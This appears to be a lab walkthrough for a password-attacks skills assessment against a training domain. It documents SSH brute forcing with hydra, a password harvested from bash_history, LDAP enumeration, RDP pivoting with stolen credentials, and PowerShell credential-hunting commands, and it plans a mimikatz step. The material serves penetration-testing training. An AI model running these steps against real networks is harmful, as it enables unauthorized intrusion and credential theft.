# Password Attacks — Skills Assessment

> **Target:** 10.129.234.116 (DMZ01) → 172.16.119.0/24 (Internal)  
> **Domain:** nexura.htb  
> **Status:** RDP session active on JUMP01 — credential hunting in progress  
> **Updated:** 2026-04-19 14:50 UTC+8

---

## Executive Summary

| Phase | Status | Key Finding |
|-------|--------|-------------|
| Foothold | ✅ Complete | jbetty / Texas123!@# via SSH brute force |
| Credential Discovery | ✅ Complete | hwilliam / dealer-screwed-gym1 (bash_history) |
| Domain Enumeration | ✅ Complete | LDAP dump reveals 3 hosts, Domain Admin: stom |
| Pivot | ✅ Complete | ligolo-ng tunnel to internal network |
| Privilege Escalation | 🔄 In Progress | RDP session on JUMP01 — hunting cached credentials |
| Flags | ⏳ Pending | user.txt, root.txt |

---

## 1. Foothold — DMZ01

### Initial Access
```bash
echo "Betty Jayde" | ./username-anarchy -i /dev/stdin > usernames.txt
hydra -L usernames.txt -p 'Texas123!@#' ssh://10.129.234.116 -t 4
# Result: jbetty / Texas123!@#
```

### Key Finding — Credential in bash_history
```bash
cat /home/jbetty/.bash_history | grep sshpass
# sshpass -p "dealer-screwed-gym1" ssh hwilliam@file01
```

| Credential | Value | Source |
|------------|-------|--------|
| Username | `hwilliam` | bash_history |
| Password | `dealer-screwed-gym1` | bash_history |

### Network Position
| Interface | IP | Network | Purpose |
|-----------|-----|---------|---------|
| ens160 | 10.129.234.116 | 10.129.0.0/16 | External/VPN |
| ens192 | 172.16.119.13 | 172.16.119.0/24 | **Internal pivot** |

---

## 2. Domain Enumeration

### LDAP Dump Results
```bash
proxychains ldapdomaindump -u 'nexura.htb\hwilliam' -p 'dealer-screwed-gym1' 172.16.119.11
```

**Domain:** nexura.htb  
**Domain Controller:** DC01 (172.16.119.11)

### Domain Users
| User | Name | Groups | Status |
|------|------|--------|--------|
| `Administrator` | — | Domain Admins, Enterprise Admins, Schema Admins | Target |
| `stom` | Tom Sandy | **Domain Admins**, MANAGEMENT | **🎯 Domain Admin** |
| `hwilliam` | William Hallam | HR | Current access |
| `bdavid` | David Brittni | IT | — |

### Domain Computers (DNS Resolved)
| Host | FQDN | IP | OS | Role |
|------|------|-----|-----|------|
| **JUMP01** | JUMP01.nexura.htb | **172.16.119.7** | Windows Server 2019 | **Jump Host** 🎯 |
| FILE01 | FILE01.nexura.htb | 172.16.119.10 | Windows Server 2019 | File Server |
| DC01 | DC01.nexura.htb | 172.16.119.11 | Windows Server 2019 | Domain Controller |

**Key Discovery:** FILE01 is at **.10**, DC01 at **.11** — separate hosts.

### Password Policy
```ini
LockoutBadCount = 0    # No account lockout!
MinimumPasswordLength = 7
PasswordComplexity = 1
```

---

## 3. Failed Attack Vectors Summary (hwilliam Context)

| Attack | Tool/Method | Result | Reason |
|--------|-------------|--------|--------|
| WinRM | evil-winrm | ❌ Failed | Authorization error |
| SMB Write | psexec | ❌ Failed | ADMIN$/C$ not writable |
| WMI | wmiexec | ❌ Failed | rpc_s_access_denied |
| RDP (proxychains) | xfreerdp | ❌ Failed | Kerberos realm error |
| Kerberoasting | GetUserSPNs | ❌ Failed | No user SPNs (only krbtgt) |
| AS-REP Roasting | GetNPUsers | ❌ Failed | No UF_DONT_REQUIRE_PREAUTH |
| Password Spray | netexec (3 passwords) | ❌ Failed | No matches |
| GPP Passwords | SYSVOL enumeration | ❌ Failed | No Preferences folders |

**Position:** hwilliam (HR group) has read-only SMB/LDAP access. Cannot execute code remotely.

---

## 4. Breakthrough — JUMP01 Access

### Discovery
- **Method:** LDAP domain_computers.json analysis
- **Host:** JUMP01.nexura.htb (172.16.119.7)
- **Role:** Jump Host (OU=Jumphosts) — where admins RDP to manage network

### RDP Connection — SUCCESS
```bash
xfreerdp /v:172.16.119.7 /u:hwilliam /p:dealer-screwed-gym1 /cert:ignore
```
**Status:** ✅ Active RDP session

### Network Topology
```
┌─────────────────────────────────────────────────────────────┐
│                    External (VPN)                            │
│                      10.129.x.x                              │
└───────────────────────────┬─────────────────────────────────┘
                            │
                    SSH port 22
                            │
┌───────────────────────────▼─────────────────────────────────┐
│                   DMZ01 (Ubuntu)                             │
│              10.129.234.116 / 172.16.119.13                  │
│                   jbetty (foothold)                          │
└───────────────────────────┬─────────────────────────────────┘
                            │ Internal 172.16.119.0/24
        ┌───────────────────┼───────────────────┐
        │                   │                   │
   RDP 3389             SMB 445             DNS 53
        │                   │                   │
┌───────▼──────┐  ┌────────▼────────┐  ┌──────▼──────┐
│   JUMP01     │  │   FILE01       │  │   DC01      │
│172.16.119.7  │  │172.16.119.10   │  │172.16.119.11│
│ Jump Host    │  │ File Server    │  │  Domain     │
│ 🎯 TARGET    │  │                │  │ Controller  │
└──────────────┘  └─────────────────┘  └─────────────┘
```

---

## 5. Current Status — JUMP01 RDP Session

**Host:** JUMP01 (172.16.119.7)  
**Access:** hwilliam via RDP  
**Objective:** Find cached credentials for privilege escalation

### Essential Commands to Run on JUMP01
```powershell
# Check context
whoami
hostname

# Find stored credentials
cmdkey /list

# Check logged-in users
quser

# Check for saved RDP sessions
reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default"

# Look for admin tools running
Get-Process | Where-Object {$_.ProcessName -match "mstsc|mmc|powershell"}

# Recent files
Get-ChildItem C:\Users\ -Recurse -Include *.txt,*.xml,*.ps1 -ErrorAction SilentlyContinue | 
    Sort-Object LastAccessTime -Descending | Select-Object -First 20
```

### Why JUMP01 is Critical
- Jump hosts store cached admin credentials
- Likely has RDP sessions to DC01
- Credential Manager may contain Domain Admin creds

---

## 6. Next Steps

1. ✅ Check Credential Manager for Domain Admin credentials (`cmdkey /list`)
2. Look for saved RDP connections to DC01
3. Run mimikatz if elevated access obtained
4. Pivot to DC01 with discovered credentials
5. Capture user.txt and root.txt flags

---

## Lessons Learned

- **Jump hosts are gold:** JUMP01 (not in initial ping sweep) revealed via LDAP enumeration
- **DNS from foothold:** DMZ01 can query DC01 DNS directly — resolved all host IPs
- **Ligolo-ng > proxychains:** RDP Kerberos issues resolved with TUN interface
- **ICMP blocked:** Ping sweep misses Windows hosts (firewall), but TCP services work
